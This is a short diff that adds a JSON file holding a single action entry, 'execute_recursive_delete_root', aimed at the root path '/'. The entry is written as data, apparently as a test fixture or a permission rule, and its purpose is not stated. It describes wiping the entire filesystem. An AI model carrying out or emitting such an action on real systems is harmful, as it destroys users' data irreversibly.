@@ -1,0 +1,6 @@
+[
+  {
+    "action": "execute_recursive_delete_root",
+    "target": "/"
+  }
+]
